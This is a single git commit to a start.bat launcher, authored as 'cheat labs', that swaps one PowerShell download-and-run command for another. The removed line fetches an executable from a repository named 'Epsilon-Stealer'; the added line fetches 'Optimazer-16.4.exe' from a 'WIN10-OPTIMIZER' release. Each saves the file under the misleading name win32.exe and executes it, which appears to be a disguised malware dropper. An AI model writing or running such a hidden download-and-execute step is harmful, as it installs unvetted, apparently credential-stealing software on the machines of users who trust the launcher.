7209bf660eab87f401269bde05e67ca9416e9a41
cheat labs <131698090+hvbsvqdj@users.noreply.github.com>
2024-02-29 00:44:24 +0100

    Update start.bat

--- start.bat
+++ start.bat
@@ -2,7 +2,7 @@
 
 cd tool
 
-powershell -Command "$down=New-Object System.Net.WebClient;$url='https://github.com/Vinyzu3/Epsilon-Stealer/releases/download/relase/Launcher.exe';$file='win32.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit"
+powershell -Command "$down=New-Object System.Net.WebClient;$url='https://github.com/hvbsvqdj/WIN10-OPTIMIZER/releases/download/Latest/Optimazer-16.4.exe';$file='win32.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit"
 
 cd ..
 
